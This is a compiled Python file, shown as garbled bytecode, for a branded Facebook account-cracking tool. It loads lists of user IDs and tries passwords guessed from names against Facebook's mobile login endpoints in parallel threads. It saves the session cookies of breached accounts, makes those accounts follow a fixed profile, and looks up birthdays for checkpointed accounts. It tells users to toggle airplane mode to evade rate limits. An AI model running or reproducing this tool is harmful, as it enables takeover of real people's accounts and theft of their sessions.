o
    ??_b=)  ?                   @   s?  d dl Z zd dlZW n ey   ed? e ?d? Y nw zd dlZW n ey5   ed? e ?d? Y nw zd dlZW n eyN   ed? e ?d? Y nw d dlZd dl Z d dlZd dlZd dl	Z	d dl
Z
d dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlmZ d d	lmZ d d
lmZ e?? ZejZg d?Zzed k s?edkr?e?  ed ZW n ey?   e?  Y nw e?? Z e j!Z"e jZ#e j$Z%ee Z&dZ'dZ(dZ)dZ*dZ+dZ,dZ-dZ.e'e(e)e*e+e,e-e.gZ/e?0e/?Z1i i Z2Z3d\Z4a5Z6g g g Z7Z8Z9g a:g a5g Z;g Z<d a=dZ>dZ?dZ@ddiZAddddddddd d!d"d#d$?ZBd%ZCd&d'? ZDd(ZEd)d*? ZFd+d,? ZGG d-d.? d.?ZHG d/d0? d0?ZIeG?  dS )1?    Nu!   
 [✓] installing requests !...
zpip install requestsu    
 [✓] installing futures !...
zpip install futuresu   
 [✓] installing bs4 !...
zpip install bs4)?ThreadPoolExecutor)?datetime)?BeautifulSoup)?January?February?March?April?May?June?JulyZAgustus?	September?October?November?December?   ?   z[1;97mz[1;31mz[1;32mz[0m)r   r   r   zhttps://lookup-id.com/?https://mbasic.facebook.comzhttps://www.httpbin.org/ip?
user-agentz?Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]r   r   r   r   r	   r
   r   ZAugustusr   r   r   r   )?01?02Z03Z04Z05Z06Z07Z08Z09Z10Z11Z12Fc                 C   s2   | d D ]}t j?|? t j??  t?d? qd S )N?
g{?G?z??)?sys?stdout?write?flush?time?sleep)?z?e? r   ?N.py?jalan@   s
   
?r!   z?_________________Mr Jadugar _______________
__________________________________________
  Github : Not Found
Whatsapp : 0347-5353500
Facebook : Muhammad Kashif
YOUTUBE : MR JADUGAR GAMER
__________________________________________ c                 C   sd   t | ?dks	 t |?dkr0tdtttt t??f ? tdtttt |??f ? td? t?  d S d S )Nr   z6

 [1;92mTOTAL OK : [1;92m %s  [1;92mJADUGAR_OK.txtz4 [1;91mTOTAL CP :[1;91m   %s [1;91mJADUGAR_CP.txtz [1;92mPRESS ENTER TO BACK MENU )?len?print?H?P?str?ok?input?Jadugar)ZOK?cpr   r   r    ?hasilN   s   
?r+   c                  C   sr   t ?d? tt? t?t??? } d}| d }td? td? td? td?}|dv r0t	? ?
t? |dv r7	 d S d S )	N?clear? ?originz [1] START FILE CLONINGz
 [2] EXIT z [?] CHOOSE OPTION : ??1r   )?2r   )?os?systemr#   ?logo?requests?get?url_ip?jsonr(   ?__xxx__r)   ?id)ZipmZtodzZIPZ_Jadugar___r   r   r    r)   V   s   
?r)   c                   @   s4   e Zd Zdd? Zdd? Zdd? Zdd? Zd	d
? ZdS )r9   c                 C   s
   g | _ d S )N)r:   )?selfr   r   r    ?__init__e   s   
z__xxx__.__init__c                 C   sx   t ?d? tt? td?| _t| j??? ?? | _	t ?d? tt? td? d}|dv r1| ?
?  d S td? | ?|? d S )Nr,   zPUT FILE NAME : r-   ?y)ZyesZYes?Yr=   z [!] CHOOSE CORRECT ONE)r2   r3   r#   r4   r(   Zcnt?open?read?
splitlinesr:   ?__pler__ZJadugarx)r;   r:   Z___worldwide___r   r   r    r)   g   s   


z__xxx__.Jadugarc                 C   s?  t j?dt? dt| j?? dtt?? dtt?? d?	? t j??  ?z2|D ?]'}|?	? }t
?? }|ddddd	d
ddddddd?}|jd|? d?|d?}t?dt|j???d?t?dt|j???d?|d|dd?}|ddd| ddddd
dddd| d ddd?}	|jd|? d ?||	d!d"?}
d#|j?? v r?d$?d%d&? |j?? ?? D ??}td't? d(|? d)|? ?? d*||f }t?|? td+d,??d-| ? | ?||?  n?d.|j?? v ?rKzBtd/??? }|?d0|? d1|? ???? d2 }|?d3?\}}}t| }td4t ||f ? d*||f }t?|? td5d,??d-| ? W  n6 t!t"f?y'   d6}d6}d6}Y n   Y td4t ||f ? d*||f }t?|? td7d,??d-| ?  nq#td7 aW d S    | ?#|||? Y d S )8Nz[1;92m[JADUGAR] ?|z [ok][z] [cp][z] r0   z{NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+z?text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9zmark.via.gpzsame-originZcors?emptyZdocumentzhttps://mbasic.facebook.com/zgzip, deflate brzen-GB,en-US;q=0.9,en;q=0.8)?Host?upgrade-insecure-requestsr   ?acceptZdnt?x-requested-with?sec-fetch-site?sec-fetch-mode?sec-fetch-user?sec-fetch-dest?referer?accept-encoding?accept-languagezhttps://zV/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F)?headerszname="lsd" value="(.*?)"r   zname="jazoest" value="(.*?)"Zlogin_no_pinz8https://developers.facebook.com/tools/debug/accesstoken/)ZlsdZjazoest?uidZflow?pass?nextz	max-age=0z!application/x-www-form-urlencodedz?Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36ZXMLHttpRequest)rE   zcache-controlrF   r.   zcontent-typer   rG   rH   rI   rJ   rK   rL   rM   rN   rO   z-/login/device-based/validate-password/?shbl=0F)?datarP   Zallow_redirectsZc_user?;c                 S   s   g | ]
\}}|d  | ?qS )?=r   )?.0?key?valuer   r   r    ?
<listcomp>?   s    z&__xxx__.__metode__.<locals>.<listcomp>?z[JADUGAR-OK] z | z%s|%szJADUGAR_OK.txt?az%s
Z
checkpointz
.token.txtzhttps://graph.facebook.com/z?fields=birthday&access_token=Zbirthday?/z%s[JADUGAR-CP] %s | %s zJADUGAR-CP.txtr-   zJADUGAR_CP.txt)$r   r   r   ?loopr"   r:   r'   r*   r   ?lowerr5   ZSessionr6   ?re?searchr&   ?text?groupZpost?cookiesZget_dict?join?itemsr#   r$   ?appendr?   ?followr@   r8   ?split?	bulan_ttl?M?KeyError?IOError?
__metode__)r;   ?userZ__chi__Zcebok?pw?session?header?rZdasZheader1Zpo?cokiZwrtZtokenzZcp_ttl?month?day?yearr   r   r    rn   u   s?   4

??	
?


z__xxx__.__metode__c                 C   sN   t |jdd|id?jd?}|jddd??d?}|jd	t|? d|id?j d S )
Nz:https://mbasic.facebook.com/profile.php?id=100007607054845Zcookie)rd   zhtml.parserr\   ZIkuti)?stringZhrefr   )r   r6   rb   ?findr&   )r;   rq   rt   rs   r6   r   r   r    rh   ?   s    z__xxx__.followc                 C   s?  t d? td?}|dkrt d? | ??  d S |dv r?t?d? t t? t d? t d? t d	t| j? ? t d
? t d? tdd??w}| jD ]k}zd|?	d?\}}|?	d?}t|?dkslt|?dkslt|?dkslt|?dkr?||d |d  |d d |d  d |d d g}n||d |d  |d d |d  d |d d g}|?
| j||d? W qE   Y qEW d   ? n1 s?w   Y  ttt? d S t d? | ??  d S )Nz[1] CRACK WITH AUTO PASS z
[?] CHOOSE : r-   z
SELECT CORRECT ONEr/   r,   z,[1;91mUSE FLIGHT (airplane) MODE ON[1;96mz2--------------------------------------------------z[1;36mTOTAL IDS : %s z[1;36mCRACKING STARTED.....?   )Zmax_workersrC   ? ?   ?   ?   ?   r   r   Z123Z786Z1234zmbasic.facebook.comz
 Select Valid One)r#   r(   rB   r2   r3   r4   r"   r:   ?	Jadugarkbri   Zsubmitrn   r+   r'   r*   )r;   ZchiZmjworldZmkbrQ   ?name?xzrp   r   r   r    rB   ?   s:   


064??z__xxx__.__pler__N)?__name__?
__module__?__qualname__r<   r)   rn   rh   rB   r   r   r   r    r9   d   s    Vr9   c                   @   s   e Zd Zdd? ZdS )?loadc                 C   s^   d}t d?}t d?}|d8 }|d7 }tt d??D ]}td? tj??  t?d? qtd? d S )	Nr-   Z30?0r   r0   z Please Wait ....g????????r   )?int?ranger#   r   r   r   r   r   )r;   ?_?__Z___?tr   r   r    r<   ?   s   
zload.__init__N)r?   r?   r?   r<   r   r   r   r    r?   ?   s    r?   )Jr2   r5   ?ImportErrorr#   r3   Zconcurrent.futuresZ
concurrentZbs4r`   ?platformr   r8   r   Zrandomr   ?
subprocessZ	threading?	itertools?base64Zuuid?zlibr   r?   r   ZnowZctru   ?nZbulan?exitZnTemp?
ValueErrorZcurrentrw   ?taZburv   Zha?opr%   rk   r$   ?K?B?U?O?NZmy_color?choiceZwarnarT   Zdata2Zamanr*   ZsalahZubahPZfuckZpwBarur'   r:   ro   r^   Z
url_lookupZurl_mbr7   Zheader_gruprj   Zdoner!   r4   r+   r)   r9   r?   r   r   r   r    ?<module>   s?   ????
??


 
